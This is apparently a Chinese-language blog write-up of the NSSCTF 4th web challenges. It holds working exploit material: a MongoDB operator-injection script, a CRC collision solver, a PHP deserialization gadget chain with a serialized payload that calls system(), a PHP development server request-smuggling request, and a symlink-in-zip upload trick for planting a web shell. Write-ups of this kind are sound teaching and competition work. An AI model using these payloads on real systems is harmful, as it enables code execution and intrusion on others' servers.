---
title: "NSSCTF 4th WEB wp 全解"
date: 2025-08-25 11:00
updated: 2025-08-25 11:00
categories: "Notes"
tags:
  - "Web Security"
  - "Writeup"
  - "PHP"
  - "Reverse"
description: "好简单......出题人！web跟其他方向不是一个画风的啊喂！ 手笨了没抢到血www WEB ez_signin 分析源码，可知当POST传入参数类型为dict时，不存在waf过滤： if isinstance(title, str): title = sanitize(title) query[&"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/19056516"
---
好简单......出题人！web跟其他方向不是一个画风的啊喂！

手笨了没抢到血www

# WEB

## ez\_signin

分析源码，可知当POST传入参数类型为dict时，不存在waf过滤：

```
                if isinstance(title, str):
                    title = sanitize(title)
                    query["$and"].append({"title": title})
                elif isinstance(title, dict):
                    query["$and"].append({"title": title})

                if isinstance(author, str):
                    author = sanitize(author)
                    query["$and"].append({"author": author})
                elif isinstance(author, dict):
                    query["$and"].append({"author": author})
```

因此我们使用dict传参。使用regex模式下的\*匹配所有项即可：

```
import requests
import json
url = "http://node9.anna.nssctf.cn:29017/search"

payload = {
    "title": {
        "$ne": ""  
    },
    "author": {
        "$regex": ".*" 
    }
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, data=json.dumps(payload), headers=headers)

print(json.dumps(response.json(), indent=2))
```

![image](/images/migrated/19056516/01.png)

## EzCRC

看了一下大概是要求POST与key内容不同，长度相同，CRC8和CRC16相同的pass。

不想手搓脚本（懒）。AI一把梭了：[https://chat01.ai/zh/chat/01K3D1CP6G832N98H0H04HQT18](https://chat01.ai/zh/chat/01K3D1CP6G832N98H0H04HQT18)

```
import random
from typing import List, Tuple

(15, 10699630, 17262, 163)

# Let's implement the CRC16 and CRC8 exactly as in the PHP code and then
# build a solver for last 3 bytes to make both CRC16 and CRC8 be zero.

def compute_crc16_py(data: bytes) -> int:
    checksum = 0xFFFF
    for b in data:
        checksum ^= b
        for _ in range(8):
            if checksum & 1:
                checksum = ((checksum >> 1) ^ 0xA001)
            else:
                checksum >>= 1
    return checksum & 0xFFFF

crc8_table = [
    0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
    0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
    0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
    0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
    0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
    0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
    0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
    0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
    0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
    0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
    0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
    0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
    0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
    0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
    0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
    0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
    0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
    0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
    0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
    0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
    0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
    0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
    0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
    0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
    0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
    0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
    0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
    0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
    0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
    0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
    0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
]

def crc8_py(data: bytes) -> int:
    crc = 0
    for b in data:
        crc = crc8_table[(crc ^ b) & 0xff]
    return crc & 0xff

secret = b"Enj0yNSSCTF4th!"
len(secret), secret

(15, b'Enj0yNSSCTF4th!')

def combined_crc(data: bytes) -> int:
    """Return combined 24-bit value: lower 16 bits = crc16, upper 8 bits = crc8 (or reversed)."""
    c16 = compute_crc16_py(data)
    c8 = crc8_py(data)
    return (c8 << 16) | c16

secret = b"Enj0yNSSCTF4th!"
len(secret), combined_crc(secret), compute_crc16_py(secret), crc8_py(secret)

def solve_rectangular(Acols: List[int], bvec: int) -> Tuple[bool, int, List[int]]:
    """
    Solve A x = b over GF(2), where A is 24 x m with columns in Acols (each 24-bit int).
    Returns (ok, x_bits, pivot_cols). x_bits is m-bit vector giving one solution with free vars 0.
    """
    m = len(Acols)
    # Build rows
    rows = [0]*24
    for r in range(24):
        row = 0
        for j in range(m):
            if (Acols[j] >> r) & 1:
                row |= (1 << j)
        rows[r] = row
    bbits = bvec
    pivot_col_for_row = [-1]*24
    r = 0
    for c in range(m):
        # find a row >= r with bit c set
        pivot = None
        for rr in range(r,24):
            if (rows[rr] >> c) & 1:
                pivot = rr; break
        if pivot is None:
            continue
        # swap rows r and pivot
        if pivot != r:
            rows[r], rows[pivot] = rows[pivot], rows[r]
            br = (bbits >> r) & 1
            bp = (bbits >> pivot) & 1
            if br != bp:
                bbits ^= (1<<r) | (1<<pivot)
        # eliminate other rows in column c
        for rr in range(24):
            if rr != r and ((rows[rr] >> c) & 1):
                rows[rr] ^= rows[r]
                if ((bbits >> r) & 1):
                    bbits ^= (1 << rr)
        pivot_col_for_row[r] = c
        r += 1
        if r == 24:
            break
    if r < 24:
        # Not full rank -> system may have no solution or infinite, but we need to ensure consistency: rows with all-zero row must have bbit zero too
        # Check consistency
        for rr in range(r,24):
            if rows[rr] == 0 and ((bbits >> rr) & 1):
                return (False, 0, [])
        # We cannot solve uniquely; but we can set some variables arbitrarily. For simplicity, try to use additional columns by reordering? Already considered.
        # We'll attempt to pick free vars as zero and determine pivot vars by back substitution using rows[0..r-1].
    # Back-substitute to get solution with free vars zero:
    x = 0
    # Work from last pivot row to first
    for i in range(r-1, -1, -1):
        c = pivot_col_for_row[i]
        # sum of A[i, j]*x_j for j>c
        sum_bit = 0
        rowmask = rows[i]
        # Bits set in rowmask excluding pivot column
        mask_ex_pivot = rowmask & ~(1 << c)
        # compute dot product with x
        tmp = mask_ex_pivot & x
        # parity of tmp bits
        sum_bit = bin(tmp).count("1") & 1
        bi = (bbits >> i) & 1
        xi = bi ^ sum_bit
        if xi:
            x |= (1 << c)
    pivot_cols = [pivot_col_for_row[i] for i in range(r) if pivot_col_for_row[i] != -1]
    return (True, x, pivot_cols)

# Test with m=120
n=15
# base message all zeros; columns for all bits across 15 bytes
Acols_all = []
base_msg = bytes([0]*n)
base_crc = combined_crc(base_msg)
target = combined_crc(secret)
bvec = base_crc ^ target  # which equals target since base_crc=CRC(zeros)
for pos in range(n):
    for bit in range(8):
        arr = bytearray(base_msg)
        arr[pos] ^= (1 << bit)
        delta = combined_crc(bytes(arr)) ^ base_crc
        Acols_all.append(delta)
ok, x, pivots = solve_rectangular(Acols_all, bvec)
ok, len(pivots), "solution nonzero bits:", bin(x).count("1") if ok else None

(True, 23, 'solution nonzero bits:', 12)

def find_fully_printable_solution_with_last4():
    printable = set(range(0x20, 0x7f))
    for attempt in range(200):
        # choose first 11 bytes randomly printable, and ensure message != secret
        prefix = bytes([random.choice(list(printable)) for _ in range(11)])
        # It's okay if some match secret; Not necessary to differ except entire string; we'll check at end.
        # Build A for last 4 positions: 11..14 indices
        positions = (11,12,13,14)
        base_msg = bytearray(prefix + b'\x00\x00\x00\x00')
        base_msg = bytes(base_msg)
        target = combined_crc(secret)
        base_crc = combined_crc(base_msg)
        bvec = base_crc ^ target
        # Build Acols for last 4 positions
        Acols = []
        for pos in positions:
            for bit in range(8):
                arr = bytearray(base_msg)
                arr[pos] ^= (1 << bit)
                delta = combined_crc(bytes(arr)) ^ base_crc
                Acols.append(delta)
        ok, x_bits, piv = solve_rectangular(Acols, bvec)
        if not ok:
            continue
        # Build nullspace basis for these 32 columns
        m = len(Acols)
        rows = [0]*24
        for r in range(24):
            row = 0
            for j in range(m):
                if (Acols[j] >> r) & 1:
                    row |= (1<<j)
            rows[r] = row
        pivot_row = [-1]*m
        pivot_col_for_row = [-1]*24
        rnk = 0
        for c in range(m):
            pivot = None
            for rr in range(rnk,24):
                if (rows[rr] >> c) & 1:
                    pivot = rr; break
            if pivot is None:
                continue
            if pivot != rnk:
                rows[rnk], rows[pivot] = rows[pivot], rows[rnk]
            for rr in range(24):
                if rr != rnk and ((rows[rr] >> c) & 1):
                    rows[rr] ^= rows[rnk]
            pivot_col_for_row[rnk] = c
            pivot_row[c] = rnk
            rnk += 1
            if rnk == 24:
                break
        free_cols = [c for c in range(m) if pivot_row[c] == -1]
        nvecs = []
        for f in free_cols:
            v = 1 << f
            for i in range(rnk-1, -1, -1):
                c = pivot_col_for_row[i]
                rowmask = rows[i]
                if bin(v & (rowmask & ~(1<<c))).count("1") & 1:
                    v ^= (1 << c)
            nvecs.append(v)
        # Try to adjust to make last 4 bytes printable
        vals = [(x_bits >> (8*i)) & 0xFF for i in range(4)]
        # Try greedy search via flipping basis vectors
        def bytes_from_solution(sol):
            return [(sol >> (8*i)) & 0xFF for i in range(4)]
        # Evaluate current bytes
        def printable_count(vs):
            return sum(1 for b in vs if b in printable)
        if all(b in printable for b in vals):
            sol = x_bits
        else:
            # Try toggling combinations up to depth 3
            best = (printable_count(vals), x_bits)
            sol = None
            basis_count = min(len(nvecs), 12)
            # Try single toggles
            for i in range(basis_count):
                s = x_bits ^ nvecs[i]
                vs = bytes_from_solution(s)
                sc = printable_count(vs)
                if sc == 4:
                    sol = s; break
                if sc > best[0]:
                    best = (sc, s)
            if sol is None:
                # try pairs
                for i in range(basis_count):
                    for j in range(i+1, basis_count):
                        s = x_bits ^ nvecs[i] ^ nvecs[j]
                        vs = bytes_from_solution(s)
                        sc = printable_count(vs)
                        if sc == 4:
                            sol = s; break
                    if sol is not None: break
            if sol is None:
                # try triples
                for i in range(basis_count):
                    for j in range(i+1, basis_count):
                        for k in range(j+1, basis_count):
                            s = x_bits ^ nvecs[i] ^ nvecs[j] ^ nvecs[k]
                            vs = bytes_from_solution(s)
                            sc = printable_count(vs)
                            if sc == 4:
                                sol = s; break
                        if sol is not None: break
                    if sol is not None: break
            if sol is None:
                sol = best[1]
        vals = bytes_from_solution(sol)
        m_final = bytearray(base_msg)
        for i, pos in enumerate(positions):
            m_final[pos] = vals[i]
        m_final = bytes(m_final)
        if all(32 <= b <= 126 for b in m_final) and m_final != secret:
            return m_final, vals, prefix
    return None

res = find_fully_printable_solution_with_last4()
res[:2] if res else None

(b'cDXM 4pujqY/-IC', [47, 45, 73, 67])
```

传入`cDXM 4pujqY/-IC`即可。

![image](/images/migrated/19056516/02.png)

## \[mpga\]filesystem

下载www.zip，有源码。action=home时POST传submit\_md5有任意反序列化

```
<?php

class ApplicationContext{
    public $contextName; 

    public function __construct(){
        $this->contextName = 'ApplicationContext';
    }

    public function __destruct(){
        $this->contextName = strtolower($this->contextName);
    }
}

class ContentProcessor{
    private $processedContent; 
    public $callbackFunction;   

    public function __construct(){
    
        $this->processedContent = new FunctionInvoker();
    }

    public function __get($key){
        
        if (property_exists($this, $key)) {
            if (is_object($this->$key) && is_string($this->callbackFunction)) {
                
                $this->$key->{$this->callbackFunction}($_POST['cmd']);
            }
        }
    }
}

class FileManager{
    public $targetFile; 
    public $responseData = 'default_response'; 

    public function __construct($targetFile = null){
        $this->targetFile = $targetFile;
    }

    public function filterPath(){ 
        
        if(preg_match('/^\/|php:|data|zip|\.\.\//i',$this->targetFile)){
            die('文件路径不符合规范');
        }
    }

    public function performWriteOperation($var){ 
        
        $targetObject = $this->targetFile; 
        $value = $targetObject->$var; 
    }

    public function getFileHash(){ 
        $this->filterPath(); 

        if (is_string($this->targetFile)) {
            if (file_exists($this->targetFile)) {
                $md5_hash = md5_file($this->targetFile);
                return "文件MD5哈希: " . htmlspecialchars($md5_hash);
            } else {
                die("文件未找到");
            }
        } else if (is_object($this->targetFile)) {
            try {
                
                $md5_hash = md5_file($this->targetFile);
                return "文件MD5哈希 (尝试): " . htmlspecialchars($md5_hash);
            } catch (TypeError $e) {
                
                
                return "无法计算MD5哈希，因为文件参数无效: " . htmlspecialchars($e->getMessage());
            }
        } else {
            die("文件未找到");
        }
    }

    public function __toString(){
        if (isset($_POST['method']) && method_exists($this, $_POST['method'])) {
            $method = $_POST['method'];
            $var = isset($_POST['var']) ? $_POST['var'] : null;
            $this->$method($var); 
        }
        return $this->responseData;
    }
}

class FunctionInvoker{
    public $functionName; 
    public $functionArguments; 
    public function __call($name, $arg){
        
        if (function_exists($name)) {
            $name($arg[0]); 
        }
    }
}

// 省略

if ($action === 'home' && isset($_POST['submit_md5'])) {
    $filename_param = isset($_POST['file_to_check']) ? $_POST['file_to_check'] : '';

    if (!empty($filename_param)) {
        $file_object = @unserialize($filename_param);
        if ($file_object === false || !($file_object instanceof FileManager)) {
            $file_object = new FileManager($filename_param);
        }
        $output = $file_object->getFileHash();
    } else {
        $output = "<p class='text-gray-600'>请输入文件路径进行MD5校验。</p>";
    }
}

?>
// 省略
```

链子：

`ApplicationContext::__destruct()`触发`FileManager::__toString()`

`FileManager::__toString()`调用`performWriteOperation`

`performWriteOperation`最终通过`ContentProcessor`和`FunctionInvoker`实现命令执行

EXP：

```
<?php

class ApplicationContext {
    public $contextName;
}

class ContentProcessor {
    private $processedContent;
    public $callbackFunction;
    public function __construct() {
        $this->processedContent = new FunctionInvoker();
    }
}

class FileManager {
    public $targetFile;
    public $responseData;

    public function __construct() {
        $this->responseData = "string_response"; 
    }
}

class FunctionInvoker {
    public function __call($name, $arguments) {
        if (function_exists($name)) {
            return $name($arguments[0]);
        }
    }
}

$invoker = new FunctionInvoker();

$processor = new ContentProcessor();
$processor->callbackFunction = 'system';
$fileManager = new FileManager();
$fileManager->targetFile = $processor; 

$appContext = new ApplicationContext();
$appContext->contextName = $fileManager; 

echo serialize($appContext);
?>
```

POST Payload（%00换\\x00）:

```
file_to_check=O:18:"ApplicationContext":1:{s:11:"contextName";O:11:"FileManager":2:{s:10:"targetFile";O:16:"ContentProcessor":2:{s:34:"%00ContentProcessor%00processedContent";O:15:"FunctionInvoker":0:{}s:16:"callbackFunction";s:6:"system";}s:12:"responseData";s:15:"string_response";}}&method=performWriteOperation&var=processedContent&cmd=dir&submit_md5=1
```

本地打一下

![image](/images/migrated/19056516/03.png)

没问题 上远程：

![image](/images/migrated/19056516/04.png)

## ez\_upload

从报错页能看出来是php development server。搜一下就能发现：

[https://blog.csdn.net/weixin\_46203060/article/details/129350280](https://blog.csdn.net/weixin_46203060/article/details/129350280)

直接抄payload打：

![image](/images/migrated/19056516/05.png)

```
GET /index.php HTTP/1.1
Host: node10.anna.nssctf.cn:22764

GET /123.123HTTP/1.1
```

这之后就是CISCN unzip同款做题方法：

创建一个软链接文件`link`，指向网站根目录`/var/www/html`，压缩上传

创建同名文件夹`link`，在文件夹里创建木马文件，在使在解压后能够覆盖`link`文件即`/var/www/html`目录，可以实现把木马解压到`/var/www/html`目录getshell

![image](/images/migrated/19056516/06.png)
